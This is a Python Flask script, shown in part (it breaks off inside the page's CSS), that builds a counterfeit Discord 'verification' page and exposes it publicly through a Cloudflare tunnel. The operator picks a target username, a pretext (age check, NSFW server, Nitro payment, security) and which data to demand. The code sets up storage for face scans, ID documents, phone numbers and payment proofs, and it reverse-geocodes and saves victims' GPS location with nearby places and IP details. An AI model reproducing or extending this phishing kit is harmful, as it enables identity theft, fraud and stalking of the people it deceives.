import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic

# --- Εγκατάσταση εξαρτήσεων και Tunnel ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip ήσυχα."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και τα απαραίτητα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά ένα cloudflared tunnel και εμφανίζει τον δημόσιο σύνδεσμο."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_discord_username():
    """Δημιουργεί ένα τυχαίο όνομα χρήστη σε στυλ Discord."""
    prefixes = ["Σκιά", "Μυστικιστή", "Επικό", "Ψηφιακό", "Κυβερνο", "Νέον", "Κβαντικό", "Κενό", "Κοσμικό", "Αστρικό",
                "Αόρατο", "Φάντασμα", "Φάσμα", "Σκιά", "Νίντζα", "Σαμουράι", "Δράκο", "Λύκο", "Αλεπού",
                "Κοράκι", "Γεράκι", "Αετός", "Τιτάνας", "Γίγαντας", "Κολοσσό", "Τέρας", "Λεβιάθαν", "Κράκεν", "Ύδρα"]
    
    suffixes = ["Κυνηγός", "Δολοφόνος", "Δάσκαλος", "Άρχοντας", "Βασιλιάς", "Βασίλισσα", "Πρίγκιπας", "Ιππότης", "Πολεμιστής", "Μάγος",
                "Μάγισσα", "Μάγος", "Μάγος", "Ιερέας", "Κληρικός", "Παλαδίνος", "Κλέφτης", "Δολοφόνος", "Καταδρομέας",
                "Βάρδος", "Μοναχός", "Δρυΐδης", "Σαμάνος", "Νεκρομάντης", "Μηχανικός", "Επιστήμονας", "Τεχνικός", "Χάκερ"]
    
    adjectives = ["Σκοτεινό", "Φωτεινό", "Χάος", "Τάξη", "Αρχαίο", "Μέλλον", "Χρόνος", "Διάστημα", "Κενό", "Άβυσσος",
                  "Κατώφλιο", "Ουράνιο", "Θείο", "Δαιμονικό", "Αγγελικό", "Ιερό", "Ανίερο", "Ιερό", "Βέβηλο",
                  "Αιώνιο", "Αθάνατο", "Θνητό", "Ζωντανό", "Νεκρό", "Ανίερο", "Ζόμπι", "Βρικόλακας", "Λυκάνθρωπος"]
    
    nouns = ["Λεπίδα", "Ασπίδα", "Τόξο", "Ράβδος", "Μαγικό Ραβδί", "Σπαθί", "Τσεκούρι", "Σφυρί", "Δόρυ", "Στιλέτο",
             "Πανοπλία", "Κράνος", "Περικάρπιο", "Μπότες", "Δαχτυλίδι", "Φυλαχτό", "Ταλισμάν", "Σφαίρα", "Κρύσταλλο", "Πετράδι",
             "Φοίνικας", "Γρύπας", "Μονόκερος", "Πήγασος", "Βασιλίσκος", "Χίμαιρα", "Μαντιχόρας", "Γοργόνα", "Σειρήνα"]
    
    username_patterns = [
        lambda: f"{random.choice(prefixes)}{random.choice(suffixes)}",
        lambda: f"{random.choice(adjectives)}{random.choice(nouns)}",
        lambda: f"Ο{random.choice(adjectives)}{random.choice(suffixes)}",
        lambda: f"{random.choice(prefixes)}_{random.choice(nouns)}",
        lambda: f"{random.choice(['xX', 'Xx'])}{random.choice(suffixes)}{random.choice(prefixes)}{random.choice(['Xx', 'xX'])}",
        lambda: f"{random.choice(adjectives)}.{random.choice(suffixes)}",
        lambda: f"Discord_{random.choice(prefixes)}",
        lambda: f"{random.choice(prefixes)}Του{random.choice(adjectives)}",
        lambda: f"{random.choice(['Επίσημος', 'Πραγματικός', 'Αληθινός'])}{random.choice(suffixes)}",
        lambda: f"{random.choice(nouns)}{random.choice(prefixes)}"
    ]
    
    return random.choice(username_patterns)()

def find_profile_picture(folder):
    """Αναζητά αρχείο εικόνας στον φάκελο για χρήση ως προφίλ."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
    
    return None

def get_verification_settings():
    """Λαμβάνει τις προτιμήσεις χρήστη για τη διαδικασία επαλήθευσης Discord."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ ΛΟΓΑΡΙΑΣΜΟΥ DISCORD")
    print("="*60)
    
    # Λήψη ονόματος χρήστη στόχου
    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΧΡΗΣΤΗ")
    print("Εισάγετε το όνομα χρήστη Discord που θα εμφανιστεί στη σελίδα επαλήθευσης")
    print("Αφήστε κενό για τυχαία δημιουργία ονόματος")
    
    username_input = input("Όνομα χρήστη στόχου (ή Enter για τυχαίο): ").strip()
    if username_input:
        settings = {'target_username': username_input}
    else:
        random_username = generate_discord_username()
        settings = {'target_username': random_username}
        print(f"[+] Δημιουργήθηκε τυχαίο όνομα: {random_username}")
    
    # Προσθήκη discriminator (#0000)
    settings['discriminator'] = f"#{random.randint(1000, 9999):04d}"
    
    # Αναζήτηση εικόνας προφίλ
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
        print(f"[+] Χρήση εικόνας προφίλ για {settings['target_username']}{settings['discriminator']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
    
    print(f"\n[+] Η επαλήθευση θα εμφανιστεί για: {settings['target_username']}{settings['discriminator']}")
    
    # Τύπος λογαριασμού
    print("\n1. Τύπος Λογαριασμού:")
    print("Γιατί χρειάζεται επαλήθευση αυτός ο λογαριασμός;")
    print("1. Επαλήθευση Ηλικίας (Ανίχνευση κάτω των 18)")
    print("2. Πρόσβαση σε Διακομιστή (NSFW/18+ διακομιστής)")
    print("3. Επαλήθευση Πληρωμής (Συνδρομή Nitro)")
    print("4. Έλεγχος Ασφαλείας (Ύποπτη δραστηριότητα)")
    
    while True:
        account_type = input("Επιλέξτε λόγο (1-4, προεπιλογή: 1): ").strip()
        if not account_type:
            settings['account_type'] = 'age'
            break
        if account_type == '1':
            settings['account_type'] = 'age'
            break
        elif account_type == '2':
            settings['account_type'] = 'server'
            break
        elif account_type == '3':
            settings['account_type'] = 'payment'
            break
        elif account_type == '4':
            settings['account_type'] = 'security'
            break
        else:
            print("Παρακαλώ εισάγετε αριθμό από 1 έως 4.")
    
    # Διάρκεια σάρωσης προσώπου
    print(f"\n2. Διάρκεια Σάρωσης Προσώπου:")
    print("Πόσα δευτερόλεπτα για την επαλήθευση προσώπου;")
    
    while True:
        try:
            duration = input("Διάρκεια σε δευτερόλεπτα (5-45, προεπιλογή: 20): ").strip()
            if not duration:
                settings['face_duration'] = 20
                break
            duration = int(duration)
            if 5 <= duration <= 45:
                settings['face_duration'] = duration
                break
            else:
                print("Παρακαλώ εισάγετε αριθμό από 5 έως 45.")
        except ValueError:
            print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    
    # Επαλήθευση ταυτότητας
    print(f"\n3. Επαλήθευση Ταυτότητας:")
    print("Απαιτείται μεταφόρτωση εγγράφου ταυτότητας;")
    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (y/n, προεπιλογή: y): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    
    if settings['id_enabled']:
        print("\nΤύπος Εγγράφου Ταυτότητας:")
        print("1. Διαβατήριο/Δελτίο Ταυτότητας (Πρωτογενής επαλήθευση)")
        print("2. Δελτίο Φοιτητή (Δευτερεύουσα επαλήθευση)")
        print("3. Πιστοποιητικό Γέννησης (Επαλήθευση ηλικίας)")
        
        while True:
            id_type = input("Επιλέξτε τύπο (1-3, προεπιλογή: 1): ").strip()
            if not id_type:
                settings['id_type'] = 'government'
                break
            if id_type == '1':
                settings['id_type'] = 'government'
                break
            elif id_type == '2':
                settings['id_type'] = 'student'
                break
            elif id_type == '3':
                settings['id_type'] = 'birth_certificate'
                break
            else:
                print("Παρακαλώ εισάγετε 1, 2 ή 3.")
    
    # Επαλήθευση τηλεφώνου
    print(f"\n4. Επαλήθευση Τηλεφώνου:")
    print("Απαιτείται επαλήθευση αριθμού τηλεφώνου;")
    phone_enabled = input("Ενεργοποίηση επαλήθευσης τηλεφώνου (y/n, προεπιλογή: y): ").strip().lower()
    settings['phone_enabled'] = phone_enabled in ['y', 'yes', '']
    
    # Επαλήθευση πληρωμής (για Nitro/επαλήθευση ηλικίας)
    if settings['account_type'] in ['payment', 'age']:
        print(f"\n5. Επαλήθευση Πληρωμής:")
        print("Απαιτείται επαλήθευση μεθόδου πληρωμής για Discord Nitro;")
        payment_enabled = input("Ενεργοποίηση επαλήθευσης πληρωμής (y/n, προεπιλογή: y): ").strip().lower()
        settings['payment_enabled'] = payment_enabled in ['y', 'yes', '']
    else:
        settings['payment_enabled'] = False
    
    # Επαλήθευση τοποθεσίας
    print(f"\n6. Επαλήθευση Τοποθεσίας:")
    print("Απαιτείται επαλήθευση τοποθεσίας;")
    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (y/n, προεπιλογή: y): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
    
    return settings

# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---

geolocator = Nominatim(user_agent="discord_verification")

def get_ip_info():
    """Λαμβάνει πληροφορίες τοποθεσίας βασισμένες σε IP."""
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_places(latitude, longitude, radius=2000, limit=3):
    """Επιστρέφει κοντινά καταστήματα/εγκαταστάσεις."""
    overpass_query = f"""
    [out:json];
    (
        node["shop"](around:{radius},{latitude},{longitude});
        way["shop"](around:{radius},{latitude},{longitude});
        node["amenity"](around:{radius},{latitude},{longitude});
        way["amenity"](around:{radius},{latitude},{longitude});
    );
    out center;
    """
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        results = []
        
        for element in elements:
            tags = element.get('tags', {})
            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
            lon_elem = element.get('lon') or element.get('center', {}).get('lon')
            
            if not lat_elem or not lon_elem:
                continue
            
            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
            
            place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "άγνωστο"
            place_name = tags.get("name", "Ανώνυμος Χώρος")
            
            results.append({
                "type": place_type,
                "name": place_name,
                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
                "distance_m": round(distance, 1)
            })
        
        results.sort(key=lambda x: x["distance_m"])
        return results[:limit]
        
    except requests.RequestException:
        return []

def process_and_save_location(data, session_id):
    """Επεξεργάζεται και αποθηκεύει δεδομένα τοποθεσίας με μεταδεδομένα."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Λήψη πληροφοριών διεύθυνσης
        address_details = {}
        full_address = "Άγνωστη"
        try:
            location = geolocator.reverse((lat, lon), language='en', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Λήψη κοντινών τόπων
        places = get_nearby_places(lat, lon)
        
        # Λήψη πληροφοριών IP
        ip_info = get_ip_info()
        
        # Προετοιμασία δομημένων δεδομένων
        location_data = {
            "verification_type": "discord_location",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy'),
                "altitude_m": data.get('altitude'),
                "speed_mps": data.get('speed'),
                "heading_degrees": data.get('heading')
            },
            "address_information": {
                "full_address": full_address,
                "house_number": address_details.get("house_number"),
                "street": address_details.get("road"),
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "postal_code": address_details.get("postcode"),
                "country": address_details.get("country")
            },
            "nearby_places": places,
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country"),
                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Άγνωστο"
            },
            "device_info": {
                "user_agent": data.get('user_agent', 'Άγνωστο'),
                "timestamp_utc": datetime.utcnow().isoformat(),
                "local_timestamp": datetime.now().isoformat()
            }
        }
        
        # Αποθήκευση σε αρχείο
        filename = f"discord_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Δεδομένα τοποθεσίας Discord αποθηκεύτηκαν: {filename}")
        
    except Exception as e:
        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")

# --- Flask Εφαρμογή ---

app = Flask(__name__)

# Καθολικές ρυθμίσεις
VERIFICATION_SETTINGS = {
    'target_username': 'ΧρήστηςDiscord_' + str(random.randint(1000, 9999)),
    'discriminator': f"#{random.randint(1000, 9999):04d}",
    'account_type': 'age',
    'face_duration': 20,
    'id_enabled': True,
    'id_type': 'government',
    'phone_enabled': True,
    'payment_enabled': False,
    'location_enabled': True,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Discord Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'phone_verification'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'payment_proofs'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_greek_html_template(settings):
    """Δημιουργεί το ελληνικό πρότυπο επαλήθευσης Discord."""
    target_username = settings['target_username']
    discriminator = settings['discriminator']
    account_type = settings['account_type']
    face_duration = settings['face_duration']
    id_enabled = settings['id_enabled']
    id_type = settings.get('id_type', 'government')
    phone_enabled = settings['phone_enabled']
    payment_enabled = settings['payment_enabled']
    location_enabled = settings['location_enabled']
    profile_picture = settings.get('profile_picture')
    profile_picture_filename = settings.get('profile_picture_filename')
    
    # Δημιουργία λεπτομερειών λογαριασμού
    account_age = random.randint(30, 365 * 3)  # ημέρες
    friends_count = random.randint(50, 500)
    servers_count = random.randint(5, 50)
    nitro_status = random.choice(['Καμία', 'Βασικό', 'Nitro', 'Nitro Classic'])
    
    # Μηνύματα τύπου λογαριασμού
    account_type_messages = {
        'age': f"Απαιτείται επαλήθευση ηλικίας για τον λογαριασμό <strong>{target_username}{discriminator}</strong>",
        'server': f"Απαιτείται επαλήθευση πρόσβασης σε διακομιστή για <strong>{target_username}{discriminator}</strong>",
        'payment': f"Απαιτείται επαλήθευση πληρωμής για Discord Nitro στον <strong>{target_username}{discriminator}</strong>",
        'security': f"Απαιτείται επαλήθευση ασφαλείας για <strong>{target_username}{discriminator}</strong>"
    }
    
    # Υπολογισμός συνολικών βημάτων
    total_steps = 2  # Εισαγωγή + Πρόσωπο
    if id_enabled:
        total_steps += 1
    if phone_enabled:
        total_steps += 1
    if payment_enabled:
        total_steps += 1
    if location_enabled:
        total_steps += 1
    total_steps += 1  # Τελικό βήμα
    
    # Δημιουργία του βασικού προτύπου
    template = f'''<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Επαλήθευση Λογαριασμού Discord</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {{
            --discord-blurple: #5865F2;
            --discord-green: #57F287;
            --discord-yellow: #FEE75C;
            --discord-red: #ED4245;
            --discord-dark: #2F3136;
            --discord-darker: #202225;
            --discord-darkest: #18191C;
            --discord-light: #FFFFFF;
            --discord-gray: #96989D;
            --discord-dark-gray: #4F545C;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }}
        
        body {{
            background-color: var(--discord-darkest);
            color: var(--discord-light);
            min-height: 100vh;
            padding: 20px;
            background-image: 
                radial-gradient(circle at 15% 50%, rgba(88, 101, 242, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 85% 30%, rgba(87, 242, 135, 0.05) 0%, transparent 20%),
                radial-gradient(circle at 50% 80%, rgba(254, 231, 92, 0.05) 0%, transparent 20%);
        }}
        
        .container {{
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }}
        
        /* Discord Header */
        .discord-header {{
            text-align: center;
            margin-bottom: 40px;
            padding-top: 20px;
        }}
        
        .discord-logo {{
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }}
        
        .discord-icon {{
            width: 60px;
            height: 60px;
            background: var(--discord-blurple);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: 700;
            color: white;
        }}
        
        .discord-title {{
            font-size: 2.5rem;
            font-weight: 800;
            color: var(--discord-light);
            letter-spacing: -0.5px;
        }}
        
        .header-subtitle {{
            color: var(--discord-gray);
            font-size: 1rem;
            margin-top: 10px;
        }}
        
        /* Account Card */
        .account-card {{
            background: linear-gradient(145deg, var(--discord-dark), var(--discord-darker));
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--discord-dark-gray);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }}
        
        .account-card::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--discord-blurple), var(--discord-green));
        }}
        
        .account-header {{
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }}
        
        .account-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--discord-blurple), var(--discord-green));
            overflow: hidden;
            margin-right: 20px;
            border: 4px solid var(--discord-darker);
            position: relative;
        }}
        
        .account-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .account-avatar::after {{
            content: '';
            position: absolute;
            top: -4px;
            left: -4px;
            right: -4px;
            bottom: -4px;
            border-radius: 50%;
            border: 2px solid rgba(88, 101, 242, 0.3);
            pointer-events: none;
        }}
        
        .account-info {{
            flex: 1;
        }}
        
        .account-name {{
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--discord-light);
            margin-bottom: 5px;
        }}
        
        .account-tag {{
            color: var(--discord-gray);
            font-size: 0.95rem;
            margin-bottom: 8px;
        }}
        
        .account-status {{
            display: inline-block;
            background: var(--discord-green);
            color: var(--discord-darkest);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }}
        
        .account-details {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid var(--discord-dark-gray);
        }}
        
        .detail-item {{
            text-align: center;
        }}
        
        .detail-value {{
            font-size: 1.1rem;
            font-weight: 700;
            color: var(--discord-blurple);
            margin-bottom: 5px;
        }}
        
        .detail-label {{
            color: var(--discord-gray);
            font-size: 0.8rem;
        }}
        
        /* Verification Container */
        .verification-container {{
            background: linear-gradient(145deg, var(--discord-dark), var(--discord-darker));
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 25px;
            border: 1px solid var(--discord-dark-gray);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }}
        
        .step {{
            display: none;
            animation: fadeIn 0.3s ease;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(10px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--discord-light);
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .step-title::before {{
            content: '';
            width: 8px;
            height: 8px;
            background: var(--discord-blurple);
            border-radius: 50%;
        }}
        
        .step-subtitle {{
            color: var(--discord-gray);
            font-size: 0.95rem;
            line-height: 1.5;
            margin-bottom: 25px;
        }}
        
        /* Progress Bar */
        .progress-container {{
            margin-bottom: 30px;
        }}
        
        .progress-header {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }}
        
        .progress-title {{
            font-weight: 600;
            color: var(--discord-light);
        }}
        
        .progress-percent {{
            color: var(--discord-green);
            font-weight: 700;
        }}
        
        .progress-bar {{
            height: 8px;
            background: var(--discord-darker);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 15px;
        }}
        
        .progress-fill {{
            height: 100%;
            background: linear-gradient(90deg, var(--discord-blurple), var(--discord-green));
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 4px;
        }}
        
        .progress-steps {{
            display: flex;
            justify-content: space-between;
            position: relative;
            margin-top: 25px;
        }}
        
        .step-indicator {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: var(--discord-darker);
            color: var(--discord-gray);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            position: relative;
            z-index: 2;
            border: 3px solid var(--discord-darker);
            transition: all 0.3s ease;
        }}
        
        .step-indicator.active {{
            background: var(--discord-blurple);
            color: white;
            border-color: var(--discord-blurple);
            box-shadow: 0 0 0 4px rgba(88, 101, 242, 0.2);
        }}
        
        .step-indicator.completed {{
            background: var(--discord-green);
            color: var(--discord-darkest);
            border-color: var(--discord-green);
        }}
        
        .step-line {{
            position: absolute;
            top: 18px;
            left: 18px;
            right: 18px;
            height: 3px;
            background: var(--discord-darker);
            z-index: 1;
        }}
        
        .step-line-fill {{
            position: absolute;
            top: 18px;
            left: 18px;
            height: 3px;
            background: linear-gradient(90deg, var(--discord-blurple), var(--discord-green));
            z-index: 1;
            width: 0%;
            transition: width 0.3s ease;
        }}
        
        /* Alert Boxes */
        .alert-box {{
            background: rgba(237, 66, 69, 0.1);
            border: 1px solid rgba(237, 66, 69, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
        }}
        
        .alert-icon {{
            font-size: 1.5rem;
            color: var(--discord-red);
            flex-shrink: 0;
        }}
        
        .alert-content {{
            flex: 1;
        }}
        
        .alert-title {{
            font-weight: 600;
            color: var(--discord-red);
            margin-bottom: 8px;
        }}
        
        .alert-text {{
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        .info-box {{
            background: rgba(88, 101, 242, 0.1);
            border: 1px solid rgba(88, 101, 242, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
        }}
        
        .info-icon {{
            font-size: 1.5rem;
            color: var(--discord-blurple);
            flex-shrink: 0;
        }}
        
        .info-content {{
            flex: 1;
        }}
        
        .info-title {{
            font-weight: 600;
            color: var(--discord-blurple);
            margin-bottom: 8px;
        }}
        
        .info-text {{
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            line-height: 1.5;
        }}
        
        .info-list {{
            list-style: none;
            padding-left: 0;
            margin-top: 10px;
        }}
        
        .info-list li {{
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            margin-bottom: 8px;
            padding-left: 20px;
            position: relative;
        }}
        
        .info-list li::before {{
            content: '•';
            color: var(--discord-green);
            position: absolute;
            left: 0;
        }}
        
        /* Face Verification */
        .face-container {{
            text-align: center;
            margin-bottom: 25px;
        }}
        
        .camera-container {{
            width: 280px;
            height: 280px;
            margin: 0 auto 25px;
            border-radius: 50%;
            overflow: hidden;
            background: var(--discord-darkest);
            border: 3px solid var(--discord-dark-gray);
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 180px;
            height: 180px;
            border: 3px solid var(--discord-blurple);
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(32, 34, 37, 0.7);
        }}
        
        .face-timer {{
            text-align: center;
            font-size: 2.2rem;
            font-weight: 700;
            color: var(--discord-green);
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }}
        
        .face-instruction {{
            background: rgba(88, 101, 242, 0.1);
            border: 1px solid rgba(88, 101, 242, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .instruction-icon {{
            font-size: 2rem;
            margin-bottom: 10px;
        }}
        
        .instruction-text {{
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 5px;
            color: var(--discord-blurple);
        }}
        
        .instruction-detail {{
            color: var(--discord-gray);
            font-size: 0.9rem;
        }}
        
        /* ID Verification */
        .id-section {{
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }}
        
        .id-card {{
            background: var(--discord-darker);
            border: 2px dashed var(--discord-dark-gray);
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }}
        
        .id-card:hover {{
            border-color: var(--discord-blurple);
            background: rgba(88, 101, 242, 0.1);
            transform: translateY(-2px);
        }}
        
        .id-card.dragover {{
            border-color: var(--discord-blurple);
            background: rgba(88, 101, 242, 0.2);
        }}
        
        .id-icon {{
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: var(--discord-blurple);
        }}
        
        .id-title {{
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--discord-light);
        }}
        
        .id-subtitle {{
            color: var(--discord-gray);
            font-size: 0.9rem;
            margin-bottom: 15px;
        }}
        
        .id-preview {{
            margin-top: 15px;
            display: none;
        }}
        
        .id-preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid var(--discord-dark-gray);
        }}
        
        .id-requirements {{
            background: var(--discord-darker);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }}
        
        .requirements-title {{
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--discord-light);
        }}
        
        .requirements-list {{
            list-style: none;
            padding-left: 0;
        }}
        
        .requirements-list li {{
            color: var(--discord-gray);
            font-size: 0.9rem;
            margin-bottom: 8px;
            padding-left: 20px;
            position: relative;
        }}
        
        .requirements-list li::before {{
            content: '•';
            color: var(--discord-blurple);
            position: absolute;
            left: 0;
        }}
        
        /* Phone Verification */
        .phone-section {{
            text-align: center;
            margin-bottom: 25px;
        }}
        
        .phone-icon {{
            font-size: 4rem;
            margin-bottom: 20px;
            color: var(--discord-green);
        }}
        
        .phone-form {{
            background: var(--discord-darker);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        .form-label {{
            display: block;
            color: var(--discord-gray);
            font-size: 0.9rem;
            margin-bottom: 8px;
            text-align: left;
        }}
        
        .form-input {{
            width: 100%;
